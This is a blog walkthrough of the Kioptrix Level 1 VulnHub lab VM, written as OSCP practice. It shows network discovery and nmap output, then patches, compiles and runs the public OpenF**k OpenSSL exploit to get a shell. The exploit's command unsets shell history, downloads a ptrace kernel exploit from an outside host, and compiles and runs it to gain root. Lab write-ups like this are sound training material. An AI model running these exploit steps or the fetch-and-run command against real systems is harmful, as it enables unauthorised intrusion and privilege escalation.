---
layout: single
title: "VulnHub - Kioptrix 1"
header:
  overlay_image: kioptrix-banner.jpg
  caption: "[__VulnHub__](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)"
related: true
comments: true
---

"Try Harder"... the quote that brings fear and confusion into every [PWK](https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/) participant; all working hard to obtain the prestigious [OSCP](https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/) Certificate.

It goes without saying that the OSCP challenges the students to prove they have a clear and practical understanding of the penetration testing process and life-cycle, all through an arduous twenty-four (24) hour certification exam.

The OSCP Websites states that:

> The successful examinee will demonstrate their ability to research the network (information gathering), identify any vulnerabilities and successfully execute attacks. This often includes modifying exploit code with the goal to compromise the systems and gain administrative access.

These Kioptrix VM write-ups are done to provide a learning experience to anyone starting in the pentesting field, or for anyone interested in going after the OSCP Certificate - due to the fact that the Kioptrix VM's are closely similar to what one might experience in the PWK Course.

Since these Kioptrix VM's closely resemble to what the PWK course will be like, then I will be limiting the use of tools such as SQLMap, and Metasploit; only relying on manual testing and other tools at my disposal. This is done because during the OSCP Exam you will not be able to use "automated" tools. Also, doing this manually allows you to get a better look and understanding behind the actual exploit that you are carrying out - requiring you to have a decent amount of understanding of the underlying vulnerability before attempting anything.

Before we begin, if you would like to try out the Kioptrix 1 VM, or just follow along as we go - then you can download it [here](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)!

So, without wasting any more time - let's get to it!

## Description:
This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways than one to successfully complete the challenges.

## The Hack:
The first step that we need to do is to carry out some __Intelligence Gathering__. That includes [Footprinting](http://www.infosecwriters.com/text_resources/pdf/Footprinting.pdf) and [Fingerprinting](https://en.wikipedia.org/wiki/TCP/IP_stack_fingerprinting) hosts, servers, etc. If you want to learn more about the proper procedures and steps then I suggest you read the [PTES Technical Guidelines](http://www.pentest-standard.org/index.php/Main_Page).

Since the VM is being hosted on my Lab PC using a [Bridged Adapter](https://www.vmware.com/support/ws4/doc/network_bridged_ws.html) over VMWare, we will go ahead and scan our network to see if we can't get the IP address. To do so, type in `netdiscover` in your terminal.

```console
 Currently scanning: 172.24.166.0/16   |   Screen View: Unique Hosts           
                                                                               
 18 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 1080             
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.1     00:26:f2:0c:b3:82      4     240  NETGEAR                     
 192.168.1.4     d8:cb:8a:bf:d0:59      2     120  Micro-Star INTL CO., LTD.   
 192.168.1.13    18:03:73:1c:5d:6a     11     660  Dell Inc.                   
 192.168.1.104   00:0c:29:a8:19:5f      1      60  VMware, Inc.
```

So the IP of 192.168.1.104 will be our Kioptrix Machine, and our target. The next thing we want to do is run an [nmap](https://nmap.org/) scan to check for any open ports and probe for running services on the VM.

```console
root@kali:~# nmap -sS -A -n 192.168.1.104

Starting Nmap 7.31 ( https://nmap.org ) at 2016-12-13 22:22 CST
Nmap scan report for 192.168.1.104
Host is up (0.0011s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1           1024/tcp  status
|_  100024  1           1024/udp  status
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
|_ssl-date: 2016-12-14T05:24:17+00:00; +1h01m51s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
1024/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:A8:19:5F (VMware)
Device type: WAP
Running: AVM embedded, Linksys embedded, Netgear embedded
OS CPE: cpe:/h:avm:fritz%21box_fon_wlan_7050 cpe:/h:linksys:wag200g cpe:/h:netgear:dg834gt
OS details: AVM FRITZ!Box FON WLAN 7050, Linksys WAG200G, or Netgear DG834GT wireless broadband router
Network Distance: 1 hop

Host script results:
|_clock-skew: mean: 1h01m51s, deviation: 0s, median: 1h01m51s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE
HOP RTT     ADDRESS
1   1.10 ms 192.168.1.104

Post-scan script results:
| clock-skew: 
|_  1h01m51s: Majority of systems scanned
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.17 seconds
```

If you don't understand what my nmap commands are doing, then I suggest you read up on nmap switches, which can be found [here](https://nmap.org/book/man-briefoptions.html)!

Taking a look at the open ports we see that we have TCP/22 Open (SSH) and TCP/80 Open (HTTP). Upon further examination of the namp output we can see that Apache is running version 1.3.20 - which is seriously outdated! At the same time, we can see that Apache is also running OpenSSL 2.8.4.

After a quick Google search for the Apache and OpenSSL Versions, we stumble across the OpenSSL [OpenF**k](https://www.exploit-db.com/exploits/764/) Exploit!

So, let's go ahead and download that exploit to your kali machine - you can also copy over the exploit script and save it using any text editor. Just make sure you save the file as __[filename].c__ so we can compile it with [GCC](https://gcc.gnu.org/).

Now - before you save anything, we have to edit the exploit for it to work - since it is pretty old!

So here are the steps to make it work:

__1) Add the following headers:__

```c
#include <openssl/rc4.h>
#include <openssl/md5.h>
```

__2) Update the URL of the C File:__

First search for `wget` and find the following line:

```c
#define COMMAND2 "unset HISTFILE; cd /tmp; wget http://packetstormsecurity.nl/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n"
```

Then replace the URL with this one:

```http
http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
```

__3) Get the libssl-dev lib__

To install the library, type the following in your [CLI](https://en.wikipedia.org/wiki/Command-line_interface):

```console
root@kali:~# apt-get update && apt-get install libssl-dev
```

__4) Update declaration of variables:__

On line 916, change:

```c
unsigned char *p, *end;
```

By adding __const__:

```c
const unsigned char *p, *end;
```

__5) Go ahead and save the file, compile the code, and we are done!__

```console
root@kali:~# gcc -o OpenFu**k 764.c -lcrypto
```

__NOTE:__ 764.c is the file that I saved my exploit script to. __\-o__ just means to output to a new exactuable called OpenF\*\*k. 

And yes - I did redact the words, just trying to keep it professional here folks! :)

Great! Now that we have our compiled exploit code, let's go ahead and run it to see its usage.

```console
root@kali:~# ./OpenF**k 

*******************************************************************
* OpenF**k v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

: Usage: ./OpenF**k target box [port] [-c N]

  target - supported box eg: 0x00
  box - hostname or IP address
  port - port for ssl connection
  -c open N connections. (use range 40-50 if u dont know)
```

Since the VM's Apache Version is 1.3.20, I will select __0x6b__ as our __target__. You can see a list of the target coes from the exploit's usageoutput, but I redacted here to save some space.

Now that we know our target version, the IP, and HTTP Port - let's go ahead and run the exploit!

```console
root@kali:~# ./OpenF**k 0x6b 192.168.1.104 443 -c 40

*******************************************************************
* OpenF**k v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8050
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
bash-2.05$ unset HISTFILE; cd /tmp; wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; 
--01:29:33--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:80... connected!
HTTP request sent, awaiting response... 301 Moved Permanently
Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]
--01:29:33--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:443... connected!
HTTP request sent, awaiting response... 200 OK
Length: 3,921 [text/x-csrc]

    0K ...                                                   100% @   1.87 MB/s

01:29:33 (1.87 MB/s) - `ptrace-kmod.c' saved [3921/3921]

[+] Attached to 1418
[+] Signal caught
[+] Shellcode placed at 0x4001189d
[+] Now wait for suid shell...
whoami
root
```

## Closing:
And there we have it! We exploited Kioptrix 1 with a well-known vulnerability and got root!

This VM in all honesty was pretty easy in terms of complexity since its main objective was to teach you the basics in tool usage and exploitation. There are 4 more levels in this series, and it just gets harder and more complex from here. So strap in and stay tuned for more!

Thanks for reading!
